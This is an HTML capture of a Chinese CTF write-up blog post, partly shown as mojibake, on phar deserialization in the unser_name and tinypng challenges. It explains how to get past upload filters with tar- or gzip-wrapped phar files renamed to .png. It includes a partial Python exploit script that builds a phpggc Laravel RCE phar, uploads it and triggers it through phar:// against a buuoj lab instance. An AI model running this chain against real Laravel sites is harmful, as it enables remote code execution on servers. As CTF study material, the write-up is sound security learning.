<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#B9897F"><meta name="author" content="th0me"><meta name="copyright" content="th0me"><meta name="generator" content="Hexo 5.4.0"><meta name="theme" content="hexo-theme-yun"><title>thinkphp5.0.23rce | th0meçš„åšå®¢</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/star-markdown-css@0.1.25/dist/yun/yun-markdown.min.css"><script src="//at.alicdn.com/t/font_1140697_dxory92pb0h.js" async></script><script src="https://cdn.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".post-content img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/svg+xml" href="/yun.svg"><link rel="mask-icon" href="/yun.svg" color="#B9897F"><link rel="preload" href="/css/hexo-theme-yun.css" as="style"><link rel="preload" href="/js/utils.js" as="script"><link rel="preload" href="/js/hexo-theme-yun.js" as="script"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><script id="yun-config">
    const Yun = window.Yun || {};
    window.CONFIG = {"hostname":"example.com","root":"/","title":"th0me","version":"1.7.0","mode":"auto","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}.","hits":"${hits} results found","hits_time":"${hits} results found in ${time} ms"},"anonymous_image":"https://cdn.jsdelivr.net/gh/YunYouJun/cdn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"fireworks":{"colors":["102, 167, 221","62, 131, 225","33, 78, 194"]}};
  </script><link rel="stylesheet" href="/css/hexo-theme-yun.css"><script src="/js/utils.js"></script><script src="/js/hexo-theme-yun.js"></script><link rel="preconnect" href="https://www.google-analytics.com" crossorigin><script async src="https://www.googletagmanager.com/gtag/js?id=G-1LL0D86CY9"></script><script>if (CONFIG.hostname === location.hostname) {
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());
  gtag('config', 'G-1LL0D86CY9');
}</script><script data-ad-client="ca-pub-2245427233262012" async src="https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script><script>(function(){
  var bp = document.createElement('script');
  var curProtocol = window.location.protocol.split(':')[0];
  if (curProtocol === 'https') {
    bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
  }
  else {
    bp.src = 'http://push.zhanzhang.baidu.com/push.js';
  }
  var s = document.getElementsByTagName("script")[0];
  s.parentNode.insertBefore(bp, s);
})();</script><!-- Google Tag Manager --><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);})(window,document,'script','dataLayer','GTM-M9KWR9L');</script><!-- End Google Tag Manager --><meta name="description" content="ä»unser_nameæ·±å…¥ç†è§£pharååºåˆ—åŒ–unser_name writeupæ ¹æ®é¢˜ç›®æç¤ºå’Œç•Œé¢åŠŸèƒ½æç¤ºï¼Œæœ‰ä¸Šä¼ åŠŸèƒ½ä¸”ååºåˆ—åŒ–ï¼Œåˆæ­¥è€ƒè™‘phar  ä¸€èˆ¬ååºåˆ—åŒ–éƒ½éœ€è¦ç™½ç›’ä»£ç æ¥æ„é€ popé“¾ï¼Œæ‰€ä»¥å…ˆçœ‹æ³¨é‡Šæœ‰æ²¡æœ‰æºä»£ç ï¼Œå‘ç°æç¤ºwww.zipï¼Œä¸‹è½½ä¸‹æ¥ã€‚ ï¼ˆæœ¬åœ°æµ‹è¯•æ—¶ä»£ç ç»è¿‡ä¿®æ”¹ï¼‰  çŒœæµ‹ååºåˆ—åŒ–é“¾å­å‡ºå£æ˜¯$find_thisæŒ‡å‘çš„å‡½æ•°ï¼Œ$name1-&gt;var&#x3D;$name2ï¼Œå†ç”¨POSTä¼ å¯¹">
<meta property="og:type" content="article">
<meta property="og:title" content="thinkphp5.0.23rce">
<meta property="og:url" content="http://example.com/2021/11/28/unser_name/index.html">
<meta property="og:site_name" content="th0meçš„åšå®¢">
<meta property="og:description" content="ä»unser_nameæ·±å…¥ç†è§£pharååºåˆ—åŒ–unser_name writeupæ ¹æ®é¢˜ç›®æç¤ºå’Œç•Œé¢åŠŸèƒ½æç¤ºï¼Œæœ‰ä¸Šä¼ åŠŸèƒ½ä¸”ååºåˆ—åŒ–ï¼Œåˆæ­¥è€ƒè™‘phar  ä¸€èˆ¬ååºåˆ—åŒ–éƒ½éœ€è¦ç™½ç›’ä»£ç æ¥æ„é€ popé“¾ï¼Œæ‰€ä»¥å…ˆçœ‹æ³¨é‡Šæœ‰æ²¡æœ‰æºä»£ç ï¼Œå‘ç°æç¤ºwww.zipï¼Œä¸‹è½½ä¸‹æ¥ã€‚ ï¼ˆæœ¬åœ°æµ‹è¯•æ—¶ä»£ç ç»è¿‡ä¿®æ”¹ï¼‰  çŒœæµ‹ååºåˆ—åŒ–é“¾å­å‡ºå£æ˜¯$find_thisæŒ‡å‘çš„å‡½æ•°ï¼Œ$name1-&gt;var&#x3D;$name2ï¼Œå†ç”¨POSTä¼ å¯¹">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127161920227.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162137224.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162402757.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162855942.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163314452.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163417690.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163700501.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163849116.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128133948839.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134126804.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134812365.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134936802.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134952445.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135240061.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135318338.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150722137.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128150952069.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151614038.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151728252.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151045404.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128151131963.png">
<meta property="og:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128152813712.png">
<meta property="article:published_time" content="2021-11-28T08:32:52.295Z">
<meta property="article:modified_time" content="2021-11-28T08:34:03.428Z">
<meta property="article:author" content="th0me">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="ååºåˆ—åŒ–">
<meta property="article:tag" content="wp">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127161920227.png"><script src="/js/ui/mode.js"></script></head><body><script defer src="https://cdn.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="Table of Contents"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-list-ordered"></use></svg></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="Overview"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-passport-line"></use></svg></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="th0me"><img width="96" loading="lazy" src="/images/1.jpg" alt="th0me"><span class="site-author-status" title="çå­æ‘¸è±¡">ğŸ˜­</span></a><div class="site-author-name"><a href="/about/">th0me</a></div><span class="site-name">th0meçš„åšå®¢</span><sub class="site-subtitle"></sub><div class="site-desciption"></div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="Home"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-home-4-line"></use></svg></span></a><div class="site-state-item"><a href="/archives/" title="Archives"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-archive-line"></use></svg></span><span class="site-state-item-count">5</span></a></div><div class="site-state-item"><a href="/categories/" title="Categories"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-folder-2-line"></use></svg></span><span class="site-state-item-count">0</span></a></div><div class="site-state-item"><a href="/tags/" title="Tags"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="site-state-item-count">8</span></a></div><a class="site-state-item hty-icon-button" href="/about/#comment" title="ç•™è¨€æ¿"><span class="site-state-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-clipboard-line"></use></svg></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://th0me.github.io/images/4.png" title="QQ 821361403" target="_blank" style="color:#12B7F5"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-qq-line"></use></svg></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="æˆ‘çš„å°ä¼™ä¼´ä»¬" style="color:dodgerblue"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-genderless-line"></use></svg></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-contrast-2-line"></use></svg></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8Eunser-name%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">ä»unser_nameæ·±å…¥ç†è§£pharååºåˆ—åŒ–</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#unser-name-writeup"><span class="toc-number">2.</span> <span class="toc-text">unser_name writeup</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%99%8E%E7%AC%A6%E6%9D%AF%E7%BA%BF%E4%B8%8Btinypng-writeup"><span class="toc-number">3.</span> <span class="toc-text">è™ç¬¦æ¯çº¿ä¸‹tinypng writeup</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BA%90%E7%A0%81%E5%88%86%E6%9E%90"><span class="toc-number">3.1.</span> <span class="toc-text">æºç åˆ†æ</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload%E5%92%8Cpoc"><span class="toc-number">3.2.</span> <span class="toc-text">payloadå’Œpoc</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B7%9F%E8%BF%9B%E4%B8%80%E4%B8%8Bphpggc-laravel-rce5%E7%9A%84%E9%93%BE%E5%AD%90"><span class="toc-number">4.</span> <span class="toc-text">è·Ÿè¿›ä¸€ä¸‹phpggc laravel rce5çš„é“¾å­</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#phpggc-laravel-rce5-exp"><span class="toc-number">4.1.</span> <span class="toc-text">phpggc laravel rce5 exp</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%94%B1unser-name%E5%92%8Ctinypng%E6%94%B6%E8%8E%B7%E7%9A%84%E6%80%BB%E7%BB%93"><span class="toc-number">5.</span> <span class="toc-text">ç”±unser_nameå’Œtinypngæ”¶è·çš„æ€»ç»“</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BB%8E%E6%BA%90%E7%A0%81%E8%A7%92%E5%BA%A6%E7%9C%8Bphar%E4%B8%BA%E4%BB%80%E4%B9%88%E8%83%BD%E8%A7%A3%E6%9E%90%E8%BF%99%E5%87%A0%E7%B1%BB%E5%8E%8B%E7%BC%A9%E5%8C%85"><span class="toc-number">6.</span> <span class="toc-text">ä»æºç è§’åº¦çœ‹pharä¸ºä»€ä¹ˆèƒ½è§£æè¿™å‡ ç±»å‹ç¼©åŒ…</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#end"><span class="toc-number">7.</span> <span class="toc-text">end</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article"><link itemprop="mainEntityOfPage" href="http://example.com/2021/11/28/unser_name/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="th0me"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="th0meçš„åšå®¢"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">thinkphp5.0.23rce<a class="post-edit-link" href="https://github.com/YunYouJun/yunyoujun.github.io/tree/hexo/source/_posts/unser_name.md" target="_blank" title="Edit this post" rel="noopener"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-edit-line"></use></svg></a></h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-calendar-line"></use></svg></span> <time title="Created: 2021-11-28 16:32:52" itemprop="dateCreated datePublished" datetime="2021-11-28T16:32:52+08:00">2021-11-28</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="Word count in article"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-file-word-line"></use></svg></span> <span title="Word count in article">2.4k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="Reading time"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-timer-line"></use></svg></span> <span title="Reading time">10m</span></span></span><div class="post-classify"><span class="post-tag"><a class="tag-item" href="/tags/ctf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">ctf</span></a><a class="tag-item" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">ååºåˆ—åŒ–</span></a><a class="tag-item" href="/tags/wp/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><svg class="icon" aria-hidden="true"><use xlink:href="#icon-price-tag-3-line"></use></svg></span><span class="tag-name">wp</span></a></span></div><div class="post-author"><span class="author-name">th0me</span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body" style="--smc-primary:#B9897F;"><h2 id="ä»unser-nameæ·±å…¥ç†è§£pharååºåˆ—åŒ–"><a href="#ä»unser-nameæ·±å…¥ç†è§£pharååºåˆ—åŒ–" class="headerlink" title="ä»unser_nameæ·±å…¥ç†è§£pharååºåˆ—åŒ–"></a>ä»unser_nameæ·±å…¥ç†è§£pharååºåˆ—åŒ–</h2><h2 id="unser-name-writeup"><a href="#unser-name-writeup" class="headerlink" title="unser_name writeup"></a>unser_name writeup</h2><p>æ ¹æ®é¢˜ç›®æç¤ºå’Œç•Œé¢åŠŸèƒ½æç¤ºï¼Œæœ‰ä¸Šä¼ åŠŸèƒ½ä¸”ååºåˆ—åŒ–ï¼Œåˆæ­¥è€ƒè™‘phar</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127161920227.png" alt="image-20211127161920227" loading="lazy"></p>
<p>ä¸€èˆ¬ååºåˆ—åŒ–éƒ½éœ€è¦ç™½ç›’ä»£ç æ¥æ„é€ popé“¾ï¼Œæ‰€ä»¥å…ˆçœ‹æ³¨é‡Šæœ‰æ²¡æœ‰æºä»£ç ï¼Œå‘ç°æç¤º<a target="_blank" rel="noopener" href="http://www.zip,ä¸‹è½½ä¸‹æ¥./">www.zipï¼Œä¸‹è½½ä¸‹æ¥ã€‚</a></p>
<p>ï¼ˆæœ¬åœ°æµ‹è¯•æ—¶ä»£ç ç»è¿‡ä¿®æ”¹ï¼‰</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162137224.png" alt="image-20211127162137224" loading="lazy"></p>
<p>çŒœæµ‹ååºåˆ—åŒ–é“¾å­å‡ºå£æ˜¯$find_thisæŒ‡å‘çš„å‡½æ•°ï¼Œ$name1-&gt;var=$name2ï¼Œå†ç”¨POSTä¼ å¯¹åº”çš„å‡½æ•°ã€‚</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162402757.png" alt="image-20211127162402757" loading="lazy"></p>
<p>ç”±äºåç¼€æ£€æŸ¥æ˜¯ç™½åå•ï¼Œä¸çŸ¥é“å·²çŸ¥çš„è§£ææ¼æ´æƒ…å†µä¸‹å°±ä¸è€ƒè™‘ç»•åç¼€äº†ï¼Œä¸è¿‡æ€è·¯ä¸Šä¹Ÿæ›´åŠ ç¡®å®šæ˜¯pharï¼Œæ¯•ç«Ÿpharå¯ä»¥æ”¹åç¼€ï¼Œå¹¶ä¸”æœ‰å¯æ§å‚æ•°çš„æ“æ§æ–‡ä»¶å‡½æ•°file_existè§¦å‘</p>
<p>è€ƒè™‘ç»•è¿‡é»‘åå•ï¼Œçœ‹åˆ°è¿™å‡ ä¸ªæ–‡ä»¶å¤´ç¬¬ä¸€æ—¶é—´å°±æƒ³åˆ°è™ç¬¦æ¯çº¿ä¸‹çš„tinypngï¼Œå¯¹pharå†gzipä¸€æ¬¡å°±å¯ä»¥ç»•è¿‡__HALT_COMPILERï¼Œä½†æ˜¯banäº†gzip bzip2 zip æ‰€ä»¥åªå‰©ä¸‹taräº†ã€‚</p>
<p>åœ¨phpåºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„æœ‰å…³æºç ä¸­<img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127162855942.png" alt="image-20211127162855942" loading="lazy"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">memcmp(entry.filename, &quot;.phar/.metadata&quot;, sizeof(&quot;.phar/.metadata&quot;)-1</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸€è¡ŒåŒ¹é…æ–‡ä»¶åæ˜¯å¦ä»¥.phar/.metadataå¼€å¤´ï¼Œä¸”åªåŒ¹é…å¼€å¤´ï¼Œæ‰€ä»¥ç»•è¿‡ä¸‹é¢çš„In_arrayç›´æ¥åœ¨åé¢åŠ ä¸Šæ— æ„ä¹‰å­—ç¬¦å°±å¯ä»¥äº†ã€‚æ¥ä¸‹æ¥phpå°±ä¼šä½¿ç”¨phar_tar_process_metadataå’Œphar_parse_metadata(&amp;metadata)å¼€å§‹ååºåˆ—åŒ–äº†ã€‚</p>
<p>æœ€åpayload:</p>
<p>åˆ¶ä½œ.phar/.metadata123</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163314452.png" alt="image-20211127163314452" loading="lazy"></p>
<p>ç”Ÿæˆtest.tar</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163417690.png" alt="image-20211127163417690" loading="lazy"></p>
<p>æ”¹åä¸ºtest.pngä¸Šä¼ </p>
<p>é€šè¿‡ç»™å‡ºçš„å‚æ•°ç®—å‡ºæ–‡ä»¶åcddc9385153d0b6c5c80a6a94dc9219c.gif</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163700501.png" alt="image-20211127163700501" loading="lazy"></p>
<p>ä½¿ç”¨pharåè®®ï¼Œfuncä¼ phpinfoå°è¯•å‘ç°æˆåŠŸ</p>
<p>æ¥ä¸‹æ¥çˆ†ç ´create_functionç”Ÿæˆçš„å‡½æ•°çš„å‡½æ•°åç§°</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211127163849116.png" alt="image-20211127163849116" loading="lazy"></p>
<p>æ‹¿åˆ°ç»“æœ</p>
<h2 id="è™ç¬¦æ¯çº¿ä¸‹tinypng-writeup"><a href="#è™ç¬¦æ¯çº¿ä¸‹tinypng-writeup" class="headerlink" title="è™ç¬¦æ¯çº¿ä¸‹tinypng writeup"></a>è™ç¬¦æ¯çº¿ä¸‹tinypng writeup</h2><h3 id="æºç åˆ†æ"><a href="#æºç åˆ†æ" class="headerlink" title="æºç åˆ†æ"></a>æºç åˆ†æ</h3><p>buuojå¤ç°</p>
<p>æ‹¿åˆ°æºç  laravelæ¡†æ¶å…ˆå…³æ³¨è·¯ç”±å’Œç›¸å¯¹åº”çš„æ§åˆ¶å™¨ã€‚</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128133948839.png" alt="image-20211128133948839" loading="lazy"></p>
<p>â€˜/â€˜è·¯ç”±ä¸‹å­˜åœ¨ç€IndexControllerï¼Œè·Ÿè¿›fileUploadæ–¹æ³•</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134126804.png" alt="image-20211128134126804" loading="lazy"></p>
<p>åœ¨laravelæ¡†æ¶ä¸­å°è£…äº†ä¸€ä¸ªRequestç±»æ¥å­˜æ”¾æœ‰å…³è¯·æ±‚å†…å®¹ï¼Œè¿™é‡Œä»$reqä¸­æ‹¿å‡ºä¸Šä¼ çš„fileå¹¶è¿›è¡Œæœ‰å…³è¿‡æ»¤ï¼Œå…¶ä¸­è¿‡æ»¤æ‰äº†HALT_COMPILERè¿™ä¸€pharçš„æ ‡å¿—å¤´ï¼Œæ¥ä¸‹æ¥æ”¹åå­—å­˜æ”¾åˆ°uploadsä¸­ã€‚</p>
<p>ç”±äºè¿‡æ»¤å†…å®¹å¾ˆä¸¥æ ¼ä¸”åç¼€è¿‡æ»¤æ˜¯ç™½åå•ï¼Œåˆä¸å­˜åœ¨å·²çŸ¥çš„è§£ææ¼æ´ï¼Œæ‰€ä»¥ä¸è€ƒè™‘å•çº¯çš„æ–‡ä»¶ä¸Šä¼ ã€‚</p>
<p>æ¢â€™/imageâ€™è·¯ç”±ä¸‹çš„ImageControllerå®¡è®¡</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134812365.png" alt="image-20211128134812365" loading="lazy"></p>
<p>handleæ–¹æ³•æ¥å—ä¸€ä¸ªimageå‚æ•°è¾“å…¥ï¼Œåç¼€å¿…é¡»ä¸ºpngï¼Œå‘ç°imgcompressç±»å’Œcompressimgæ–¹æ³•ï¼Œè·Ÿè¿›ä¸€ä¸‹compressimg</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134936802.png" alt="image-20211128134936802" loading="lazy"></p>
<p>è·Ÿè¿›openImage()</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128134952445.png" alt="image-20211128134952445" loading="lazy"></p>
<p>å‘ç°getimagesize()ï¼Œè¯¥æ–¹æ³•å¯ä»¥è§¦å‘pharååºåˆ—åŒ–ã€‚</p>
<p>åˆ°è¿™ä¸ªåœ°æ–¹æ€è·¯å°±éå¸¸æ˜ç¡®ï¼Œåªè¦$this-&gt;srcå¯æ§ï¼Œå°±å¯ä»¥é€šè¿‡ä¸Šä¼ çš„pharæ–‡ä»¶æ¥è¿›è¡Œååºåˆ—åŒ–æ“ä½œã€‚</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135240061.png" alt="image-20211128135240061" loading="lazy"></p>
<p>å‘ç°$this-&gt;srcæ˜¯åœ¨æ„é€ ç±»çš„æ—¶å€™è¿›è¡Œçš„èµ‹å€¼ã€‚</p>
<p><img src="https://raw.githubusercontent.com/th0me/images/main/blog/image-20211128135318338.png" alt="image-20211128135318338" loading="lazy"></p>
<p>è€Œç±»çš„å®ä¾‹åŒ–æ—¶ä½¿ç”¨çš„å¯¹åº”å‚æ•°ä¸º$source $sourceåˆç­‰äºinput(â€˜imageâ€™)ï¼Œæ•…å¯æ§ã€‚</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡æ‰¾gadget chainé€šè¿‡ååºåˆ—åŒ–æ¥è¿›è¡Œæ¼æ´åˆ©ç”¨äº†ï¼Œä¸Šphpggcä¸€æŠŠæ¢­ã€‚</p>
<h3 id="payloadå’Œpoc"><a href="#payloadå’Œpoc" class="headerlink" title="payloadå’Œpoc"></a>payloadå’Œpoc</h3><p>åœ¨buuojä¸Šå¤ç°è¿œç¨‹æ­»æ´»æ‰“ä¸é€šï¼ŒæŸ¥è¯¢ç›¸å…³é¢˜è§£å‘ç°ä¹Ÿæœ‰äººæ‰“ä¸é€šï¼Œå°±ä¸æ­»ç£•äº†ï¼Œè®°å½•ä¸ªè„šæœ¬æ—¥åæ¥æµ‹ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"># -*- coding=utf-8 -*-</span><br><span class="line"># Author:Crispr</span><br><span class="line"># æ³¨æ„æ”¾åœ¨phpggcæ ¹ç›®å½•è¿è¡Œ</span><br><span class="line"></span><br><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line"></span><br><span class="line">url = &quot;http://b6a64602-069f-454e-a440-bfa1cfa72d57.node3.buuoj.cn/&quot;</span><br><span class="line">session = requests.session()</span><br><span class="line"></span><br><span class="line">def create_gzfile():</span><br><span class="line">    cmd = r&quot;&quot;&quot;php -d&#x27;readonly=0&#x27; ./phpggc Laravel/RCE6 &quot;system(&#x27;whoami&#x27;);&quot; --phar phar &gt; crispr.phar&quot;&quot;&quot;</span><br><span class="line">    os.system(cmd)</span><br><span class="line">    cmd = r&quot;gzip crispr.phar&quot;</span><br><span class="line">    os.system(cmd)</span><br><span class="line">    cmd = r&quot;mv crispr.phar.gz crispr.phar.png&quot;</span><br><span class="line">    os.system(cmd)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def get_upload_png_path():</span><br><span class="line">    files = &#123;&quot;file&quot; : (&quot;crispr.phar.png&quot; , open(&quot;./crispr.phar.png&quot;,&quot;rb+&quot;),&quot;image/png&quot;)&#125;</span><br><span class="line">    r = session.post(url,files=files)</span><br><span class="line">    if r.status_code == 200:</span><br><span class="line">        text = r.text</span><br><span class="line">        #print(text)</span><br><span class="line">        path = re.findall(&#x27;path: (.*?)\.png&#x27;,text)[0]</span><br><span class="line">        #print(path)</span><br><span class="line">        return path</span><br><span class="line">    else:</span><br><span class="line">        print(&quot;upload false&quot;)</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">def deserialize(path):</span><br><span class="line">    url1 = url + &quot;image?image=phar://../storage/app/&quot; + path + &quot;.png&quot;</span><br><span class="line">    print(url1)</span><br><span class="line">    r = session.get(url1)</span><br><span class="line">    print(r.text)</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    create_gzfile()</span><br><span class="line">    path = get_upload_png_path()</span><br><span class="line">    print(path)</span><br><span class="line">    